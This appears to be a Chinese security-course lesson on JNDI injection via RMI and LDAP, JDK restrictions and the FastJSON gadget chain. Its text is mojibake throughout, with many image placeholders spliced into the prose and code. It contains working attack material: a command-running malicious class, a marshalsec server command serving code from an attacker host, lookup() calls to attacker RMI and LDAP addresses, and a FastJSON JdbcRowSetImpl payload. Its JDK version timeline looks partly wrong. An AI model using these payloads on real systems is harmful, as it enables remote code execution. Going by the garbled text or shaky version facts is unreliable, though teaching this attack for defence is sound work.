# ğŸš€ è¯¾ç¨‹ P37ï¼šJavaEEåº”ç”¨ä¸JNDIæ³¨å…¥ã€RMIæœåŠ¡ã€LDAPæœåŠ¡ã€JDKç»•è¿‡åŠè°ƒç”¨é“¾ç±»

![](img/9b28d368abfb9a24f122907b3553fbc7_1.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_3.png)

åœ¨æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†è¦å­¦ä¹ JavaEEåº”ç”¨ä¸­çš„JNDIæ³¨å…¥ã€RMIæœåŠ¡ã€LDAPæœåŠ¡ã€JDKç‰ˆæœ¬ç»•è¿‡ä»¥åŠç›¸å…³çš„è°ƒç”¨é“¾ç±»ã€‚æˆ‘ä»¬å°†ä»åŸºç¡€æ¦‚å¿µå…¥æ‰‹ï¼Œé€æ­¥æ·±å…¥åˆ°å®é™…åˆ©ç”¨åœºæ™¯ï¼Œå¸®åŠ©åˆå­¦è€…ç†è§£è¿™äº›å¤æ‚çš„å®‰å…¨æ¦‚å¿µã€‚

![](img/9b28d368abfb9a24f122907b3553fbc7_5.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_6.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_8.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_10.png)

## ğŸ“š æ¦‚è¿°ï¼šä»€ä¹ˆæ˜¯JNDIï¼Ÿ

![](img/9b28d368abfb9a24f122907b3553fbc7_12.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_14.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_16.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_18.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_20.png)

JNDIå…¨ç§°ä¸ºJava Naming and Directory Interfaceï¼Œå³Javaå‘½åå’Œç›®å½•æ¥å£ã€‚å®ƒæ˜¯ä¸€ä¸ªå†…ç½®çš„æ¥å£ï¼Œç”¨äºå®ç°å¯¹è±¡å’ŒæœåŠ¡çš„è°ƒç”¨ã€‚JNDIæ”¯æŒå¤šç§æœåŠ¡ï¼ŒåŒ…æ‹¬RMIã€LDAPã€CORBAå’ŒDNSç­‰ã€‚ç®€å•æ¥è¯´ï¼ŒJNDIå…è®¸Javaåº”ç”¨ç¨‹åºé€šè¿‡ç»Ÿä¸€çš„æ¥å£è®¿é—®å„ç§å‘½åå’Œç›®å½•æœåŠ¡ã€‚

![](img/9b28d368abfb9a24f122907b3553fbc7_22.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_24.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_26.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_28.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_30.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_32.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_34.png)

åœ¨å®‰å…¨é¢†åŸŸï¼ŒJNDIæ³¨å…¥æ˜¯ä¸€ç§å¸¸è§çš„å®‰å…¨æ”»å‡»æ‰‹æ®µã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨JNDIæ¥å£ï¼Œè¿œç¨‹è°ƒç”¨æ¶æ„çš„Javaä»£ç ï¼Œä»è€Œå®ç°å‘½ä»¤æ‰§è¡Œç­‰æ”»å‡»ã€‚

![](img/9b28d368abfb9a24f122907b3553fbc7_36.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_38.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_40.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_42.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_44.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_46.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_48.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_50.png)

## ğŸ” JNDIæ³¨å…¥çš„åŸºæœ¬åŸç†

![](img/9b28d368abfb9a24f122907b3553fbc7_52.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_54.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_56.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_58.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_60.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_62.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_64.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_66.png)

JNDIæ³¨å…¥çš„æ ¸å¿ƒåœ¨äº`javax.naming.InitialContext.lookup()`æ–¹æ³•ã€‚è¯¥æ–¹æ³•ç”¨äºæŸ¥æ‰¾å’Œè°ƒç”¨è¿œç¨‹æˆ–æœ¬åœ°çš„å¯¹è±¡å’ŒæœåŠ¡ã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶`lookup()`æ–¹æ³•çš„å‚æ•°ï¼Œå°±å¯ä»¥æŒ‡å‘æ¶æ„çš„RMIæˆ–LDAPæœåŠ¡ï¼Œä»è€Œè§¦å‘è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

![](img/9b28d368abfb9a24f122907b3553fbc7_68.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_70.png)

ä»¥ä¸‹æ˜¯JNDIæ³¨å…¥çš„åŸºæœ¬ä»£ç ç¤ºä¾‹ï¼š

![](img/9b28d368abfb9a24f122907b3553fbc7_72.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_74.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_76.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_78.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_80.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_82.png)

```java
import javax.naming.InitialContext;
import javax.naming.NamingException;

![](img/9b28d368abfb9a24f122907b3553fbc7_84.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_86.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_88.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_90.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_92.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_94.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_96.png)

public class JNDIDemo {
    public static void main(String[] args) throws NamingException {
        InitialContext ctx = new InitialContext();
        ctx.lookup("rmi://attacker-ip:1099/æ¶æ„å¯¹è±¡");
    }
}
```

![](img/9b28d368abfb9a24f122907b3553fbc7_98.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_100.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_102.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_104.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_106.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_108.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_110.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_112.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_114.png)

è¿™æ®µä»£ç é€šè¿‡`InitialContext.lookup()`æ–¹æ³•è°ƒç”¨äº†ä¸€ä¸ªRMIæœåŠ¡ã€‚å¦‚æœRMIæœåŠ¡æŒ‡å‘æ¶æ„çš„Javaç±»ï¼Œå°±ä¼šè§¦å‘è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

![](img/9b28d368abfb9a24f122907b3553fbc7_116.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_118.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_120.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_122.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_124.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_126.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_127.png)

## ğŸ› ï¸ RMIä¸LDAPæœåŠ¡

![](img/9b28d368abfb9a24f122907b3553fbc7_129.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_131.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_133.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_135.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_137.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_139.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_141.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_143.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_145.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_146.png)

RMIï¼ˆRemote Method Invocationï¼‰å’ŒLDAPï¼ˆLightweight Directory Access Protocolï¼‰æ˜¯JNDIæ”¯æŒçš„ä¸¤ç§ä¸»è¦æœåŠ¡ã€‚å®ƒä»¬éƒ½å¯ä»¥ç”¨äºè¿œç¨‹è°ƒç”¨Javaå¯¹è±¡ï¼Œä½†åœ¨åè®®å’Œç”¨é€”ä¸Šæœ‰æ‰€ä¸åŒã€‚

![](img/9b28d368abfb9a24f122907b3553fbc7_148.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_150.png)

### RMIæœåŠ¡
RMIæ˜¯Javaçš„è¿œç¨‹æ–¹æ³•è°ƒç”¨åè®®ï¼Œé»˜è®¤ç«¯å£ä¸º1099ã€‚å®ƒå…è®¸ä¸€ä¸ªJavaè™šæ‹Ÿæœºä¸Šçš„å¯¹è±¡è°ƒç”¨å¦ä¸€ä¸ªJavaè™šæ‹Ÿæœºä¸Šçš„å¯¹è±¡ã€‚åœ¨JNDIæ³¨å…¥ä¸­ï¼ŒRMIå¸¸ç”¨äºè¿œç¨‹åŠ è½½å’Œæ‰§è¡Œæ¶æ„çš„Javaç±»ã€‚

![](img/9b28d368abfb9a24f122907b3553fbc7_152.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_154.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_156.png)

### LDAPæœåŠ¡
LDAPæ˜¯è½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼Œé»˜è®¤ç«¯å£ä¸º389ã€‚å®ƒä¸»è¦ç”¨äºè®¿é—®å’Œç»´æŠ¤åˆ†å¸ƒå¼ç›®å½•ä¿¡æ¯æœåŠ¡ã€‚åœ¨JNDIæ³¨å…¥ä¸­ï¼ŒLDAPä¹Ÿå¯ä»¥ç”¨äºè¿œç¨‹åŠ è½½å’Œæ‰§è¡ŒJavaç±»ã€‚

![](img/9b28d368abfb9a24f122907b3553fbc7_158.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_160.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_162.png)

ä»¥ä¸‹æ˜¯ä½¿ç”¨RMIå’ŒLDAPæœåŠ¡çš„ç¤ºä¾‹ï¼š

![](img/9b28d368abfb9a24f122907b3553fbc7_164.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_166.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_168.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_170.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_172.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_174.png)

```java
// RMIç¤ºä¾‹
ctx.lookup("rmi://attacker-ip:1099/æ¶æ„å¯¹è±¡");

![](img/9b28d368abfb9a24f122907b3553fbc7_176.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_178.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_180.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_182.png)

// LDAPç¤ºä¾‹
ctx.lookup("ldap://attacker-ip:389/æ¶æ„å¯¹è±¡");
```

![](img/9b28d368abfb9a24f122907b3553fbc7_184.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_186.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_188.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_190.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_192.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_194.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_196.png)

## ğŸ§ª å®éªŒï¼šJNDIæ³¨å…¥çš„å®é™…åˆ©ç”¨

![](img/9b28d368abfb9a24f122907b3553fbc7_198.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_200.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_202.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_204.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_206.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_208.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_210.png)

ä¸ºäº†å¸®åŠ©å¤§å®¶æ›´å¥½åœ°ç†è§£JNDIæ³¨å…¥ï¼Œæˆ‘ä»¬å°†é€šè¿‡ä¸€ä¸ªç®€å•çš„å®éªŒæ¥æ¼”ç¤ºå…¶åˆ©ç”¨è¿‡ç¨‹ã€‚å®éªŒæ­¥éª¤å¦‚ä¸‹ï¼š

![](img/9b28d368abfb9a24f122907b3553fbc7_212.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_214.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_216.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_218.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_220.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_222.png)

1. **ç¼–è¯‘æ¶æ„Javaç±»**ï¼šç¼–å†™ä¸€ä¸ªæ‰§è¡Œå‘½ä»¤çš„Javaç±»ï¼Œå¹¶å°†å…¶ç¼–è¯‘ä¸ºclassæ–‡ä»¶ã€‚
2. **å¯åŠ¨æ¶æ„RMI/LDAPæœåŠ¡**ï¼šä½¿ç”¨å·¥å…·å¯åŠ¨ä¸€ä¸ªRMIæˆ–LDAPæœåŠ¡ï¼ŒæŒ‡å‘æ¶æ„classæ–‡ä»¶ã€‚
3. **è§¦å‘JNDIæ³¨å…¥**ï¼šåœ¨ç›®æ ‡åº”ç”¨ä¸­è°ƒç”¨`lookup()`æ–¹æ³•ï¼ŒæŒ‡å‘æ¶æ„æœåŠ¡ã€‚

![](img/9b28d368abfb9a24f122907b3553fbc7_224.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_226.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_228.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_230.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_232.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_234.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_236.png)

ä»¥ä¸‹æ˜¯å®éªŒçš„å…·ä½“æ­¥éª¤ï¼š

![](img/9b28d368abfb9a24f122907b3553fbc7_238.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_240.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_242.png)

### æ­¥éª¤1ï¼šç¼–è¯‘æ¶æ„Javaç±»
ç¼–å†™ä¸€ä¸ªç®€å•çš„Javaç±»ï¼Œç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š

![](img/9b28d368abfb9a24f122907b3553fbc7_244.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_246.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_248.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_250.png)

```java
public class MaliciousClass {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

![](img/9b28d368abfb9a24f122907b3553fbc7_252.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_254.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_256.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_258.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_259.png)

ä½¿ç”¨`javac`å‘½ä»¤ç¼–è¯‘è¯¥ç±»ï¼š
```bash
javac MaliciousClass.java
```

![](img/9b28d368abfb9a24f122907b3553fbc7_261.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_263.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_265.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_267.png)

### æ­¥éª¤2ï¼šå¯åŠ¨æ¶æ„RMIæœåŠ¡
ä½¿ç”¨å·¥å…·ï¼ˆå¦‚`marshalsec`ï¼‰å¯åŠ¨ä¸€ä¸ªRMIæœåŠ¡ï¼ŒæŒ‡å‘æ¶æ„classæ–‡ä»¶ï¼š
```bash
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker-ip:8000/#MaliciousClass" 1099
```

![](img/9b28d368abfb9a24f122907b3553fbc7_269.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_271.png)

### æ­¥éª¤3ï¼šè§¦å‘JNDIæ³¨å…¥
åœ¨ç›®æ ‡åº”ç”¨ä¸­è°ƒç”¨`lookup()`æ–¹æ³•ï¼š
```java
InitialContext ctx = new InitialContext();
ctx.lookup("rmi://attacker-ip:1099/MaliciousClass");
```

![](img/9b28d368abfb9a24f122907b3553fbc7_273.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_275.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_277.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_279.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_281.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_283.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_285.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_287.png)

æ‰§è¡Œä¸Šè¿°ä»£ç åï¼Œç›®æ ‡ç³»ç»Ÿä¼šå¼¹å‡ºè®¡ç®—å™¨ï¼Œè¯æ˜JNDIæ³¨å…¥æˆåŠŸã€‚

![](img/9b28d368abfb9a24f122907b3553fbc7_289.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_291.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_293.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_295.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_297.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_299.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_301.png)

## ğŸ›¡ï¸ JDKç‰ˆæœ¬ç»•è¿‡

![](img/9b28d368abfb9a24f122907b3553fbc7_303.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_305.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_307.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_309.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_311.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_313.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_315.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_317.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_319.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_321.png)

éšç€JDKç‰ˆæœ¬çš„æ›´æ–°ï¼ŒJNDIæ³¨å…¥çš„åˆ©ç”¨å—åˆ°äº†ä¸€å®šçš„é™åˆ¶ã€‚ä¾‹å¦‚ï¼Œé«˜ç‰ˆæœ¬çš„JDKé»˜è®¤ç¦ç”¨äº†RMIå’ŒLDAPçš„è¿œç¨‹ç±»åŠ è½½åŠŸèƒ½ã€‚ä»¥ä¸‹æ˜¯JDKç‰ˆæœ¬å¯¹JNDIæ³¨å…¥çš„å½±å“ï¼š

![](img/9b28d368abfb9a24f122907b3553fbc7_323.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_325.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_327.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_329.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_331.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_333.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_335.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_337.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_339.png)

- **JDK 6u141ã€7u131ã€8u121ä¹‹å‰**ï¼šRMIå’ŒLDAPå‡å¯ç”¨äºJNDIæ³¨å…¥ã€‚
- **JDK 8u191ä¹‹å**ï¼šRMIçš„è¿œç¨‹ç±»åŠ è½½è¢«ç¦ç”¨ï¼Œä½†LDAPä»å¯ç»•è¿‡ã€‚
- **JDK 11.0.1ä¹‹å**ï¼šLDAPçš„è¿œç¨‹ç±»åŠ è½½ä¹Ÿè¢«ç¦ç”¨ã€‚

![](img/9b28d368abfb9a24f122907b3553fbc7_341.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_343.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_345.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_347.png)

ä¸ºäº†ç»•è¿‡è¿™äº›é™åˆ¶ï¼Œæ”»å‡»è€…é€šå¸¸ä¼šä½¿ç”¨ä¸€äº›æŠ€å·§ï¼Œä¾‹å¦‚åˆ©ç”¨æœ¬åœ°ç±»åŠ è½½æˆ–ç»“åˆå…¶ä»–æ¼æ´ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç»•è¿‡JDKé™åˆ¶çš„ç¤ºä¾‹ï¼š

![](img/9b28d368abfb9a24f122907b3553fbc7_349.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_351.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_353.png)

```java
// ä½¿ç”¨LDAPç»•è¿‡JDKé™åˆ¶
ctx.lookup("ldap://attacker-ip:1386/æ¶æ„å¯¹è±¡");
```

## ğŸ”— è°ƒç”¨é“¾ç±»

![](img/9b28d368abfb9a24f122907b3553fbc7_355.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_357.png)

åœ¨å®é™…çš„Javaåº”ç”¨ä¸­ï¼ŒJNDIæ³¨å…¥é€šå¸¸ä¸å…¶ä»–æ¼æ´ç»“åˆä½¿ç”¨ï¼Œå½¢æˆè°ƒç”¨é“¾ã€‚ä¾‹å¦‚ï¼ŒFastJSONååºåˆ—åŒ–æ¼æ´ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡JNDIæ³¨å…¥å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

![](img/9b28d368abfb9a24f122907b3553fbc7_359.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_361.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_363.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_365.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_367.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_369.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_371.png)

ä»¥ä¸‹æ˜¯FastJSONæ¼æ´ä¸­JNDIæ³¨å…¥çš„ç¤ºä¾‹ï¼š

![](img/9b28d368abfb9a24f122907b3553fbc7_373.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_375.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_377.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_379.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_381.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_382.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_384.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_386.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_388.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_390.png)

```json
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker-ip:1389/æ¶æ„å¯¹è±¡",
    "autoCommit": true
}
```

![](img/9b28d368abfb9a24f122907b3553fbc7_392.png)

åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œ`JdbcRowSetImpl`ç±»ä¼šè°ƒç”¨`lookup()`æ–¹æ³•ï¼Œä»è€Œè§¦å‘JNDIæ³¨å…¥ã€‚

![](img/9b28d368abfb9a24f122907b3553fbc7_394.png)

## ğŸ“ æ€»ç»“

![](img/9b28d368abfb9a24f122907b3553fbc7_396.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_397.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_399.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_401.png)

æœ¬èŠ‚è¯¾ä¸­æˆ‘ä»¬ä¸€èµ·å­¦ä¹ äº†JNDIæ³¨å…¥çš„åŸºæœ¬åŸç†ã€RMIä¸LDAPæœåŠ¡çš„ä½¿ç”¨ã€JDKç‰ˆæœ¬ç»•è¿‡ä»¥åŠè°ƒç”¨é“¾ç±»çš„å®é™…åº”ç”¨ã€‚ä»¥ä¸‹æ˜¯æœ¬èŠ‚è¯¾çš„æ ¸å¿ƒçŸ¥è¯†ç‚¹ï¼š

![](img/9b28d368abfb9a24f122907b3553fbc7_403.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_405.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_407.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_409.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_411.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_413.png)

1. **JNDIæ˜¯ä»€ä¹ˆ**ï¼šJavaå‘½åå’Œç›®å½•æ¥å£ï¼Œç”¨äºè¿œç¨‹è°ƒç”¨å¯¹è±¡å’ŒæœåŠ¡ã€‚
2. **JNDIæ³¨å…¥çš„åŸç†**ï¼šé€šè¿‡`InitialContext.lookup()`æ–¹æ³•è°ƒç”¨æ¶æ„RMIæˆ–LDAPæœåŠ¡ã€‚
3. **RMIä¸LDAPæœåŠ¡**ï¼šåˆ†åˆ«ç”¨äºè¿œç¨‹æ–¹æ³•è°ƒç”¨å’Œç›®å½•è®¿é—®ï¼Œå‡å¯ç”¨äºJNDIæ³¨å…¥ã€‚
4. **JDKç‰ˆæœ¬ç»•è¿‡**ï¼šé«˜ç‰ˆæœ¬JDKé™åˆ¶äº†RMIå’ŒLDAPçš„è¿œç¨‹ç±»åŠ è½½ï¼Œä½†å¯é€šè¿‡æŠ€å·§ç»•è¿‡ã€‚
5. **è°ƒç”¨é“¾ç±»**ï¼šJNDIæ³¨å…¥å¸¸ä¸å…¶ä»–æ¼æ´ç»“åˆï¼Œå½¢æˆæ”»å‡»é“¾ã€‚

![](img/9b28d368abfb9a24f122907b3553fbc7_415.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_417.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_419.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_421.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_423.png)

![](img/9b28d368abfb9a24f122907b3553fbc7_425.png)

å¸Œæœ›é€šè¿‡æœ¬èŠ‚è¯¾çš„å­¦ä¹ ï¼Œå¤§å®¶èƒ½å¤Ÿå¯¹JNDIæ³¨å…¥æœ‰ä¸€ä¸ªåˆæ­¥çš„äº†è§£ï¼Œå¹¶èƒ½å¤Ÿåœ¨å®é™…åº”ç”¨ä¸­è¯†åˆ«å’Œé˜²èŒƒè¿™ç±»å®‰å…¨é£é™©ã€‚